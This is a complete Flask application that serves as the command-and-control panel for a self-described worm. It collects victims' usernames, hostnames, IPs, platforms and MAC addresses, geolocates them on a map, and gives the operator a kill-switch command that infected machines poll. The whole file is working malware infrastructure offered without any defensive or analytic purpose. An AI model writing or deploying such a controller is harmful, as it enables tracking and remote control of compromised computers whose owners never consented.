from flask import Flask, request, render_template_string, redirect
from datetime import datetime
import json
import requests

app = Flask(__name__)
data_log = []
kill_switch = False

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
  <title>🕷 Worm Dashboard</title>
  <style>
    body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
    h1 { color: #0f0; }
    button { padding: 8px 12px; font-size: 16px; margin: 10px 0; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { border: 1px solid #333; padding: 8px; text-align: left; }
    th { background: #222; }
    tr:nth-child(even) { background-color: #1a1a1a; }
    #map { height: 400px; margin-top: 30px; }
  </style>
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
</head>
<body>
  <h1>🧬 Worm Dashboard</h1>
  <form action="/toggle_kill" method="POST">
    <button style="background: {{ 'red' if kill else 'green' }}; color: white;" type="submit">
      {{ 'Deactivate' if kill else 'Activate' }} Kill Switch
    </button>
  </form>

  <table>
    <tr>
      <th>Time</th>
      <th>Username</th>
      <th>Hostname</th>
      <th>IP</th>
      <th>Platform</th>
      <th>MAC</th>
    </tr>
    {% for entry in data %}
    <tr>
      <td>{{ entry.time }}</td>
      <td>{{ entry.username }}</td>
      <td>{{ entry.hostname }}</td>
      <td>{{ entry.ip }}</td>
      <td>{{ entry.platform }}</td>
      <td>{{ entry.mac }}</td>
    </tr>
    {% endfor %}
  </table>

  <div id="map"></div>

  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
  <script>
    const map = L.map('map').setView([20, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

    const data = {{ geo | safe }};
    data.forEach(client => {
      if (client.lat && client.lon) {
        L.marker([client.lat, client.lon])
         .addTo(map)
         .bindPopup(`<b>${client.hostname}</b><br>${client.ip}`);
      }
    });
  </script>
</body>
</html>
"""

@app.route("/collect", methods=["POST"])
def collect():
    j = request.json
    ip = request.remote_addr
    geo = get_geo(ip)
    entry = {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "username": j.get("username", ""),
        "hostname": j.get("hostname", ""),
        "ip": ip,
        "platform": j.get("platform", ""),
        "mac": j.get("mac", ""),
        "lat": geo.get("lat"),
        "lon": geo.get("lon")
    }
    data_log.append(entry)
    return "OK"

@app.route("/command")
def command():
    return "KILL" if kill_switch else "OK"

@app.route("/toggle_kill", methods=["POST"])
def toggle_kill():
    global kill_switch
    kill_switch = not kill_switch
    return redirect("/")

@app.route("/")
def dashboard():
    return render_template_string(TEMPLATE, data=data_log, geo=data_log, kill=kill_switch)

def get_geo(ip):
    try:
        if ip.startswith("127.") or ip.startswith("192.168.") or ip.startswith("10."):
            return {}
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=lat,lon").json()
        return {"lat": resp.get("lat"), "lon": resp.get("lon")}
    except:
        return {}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
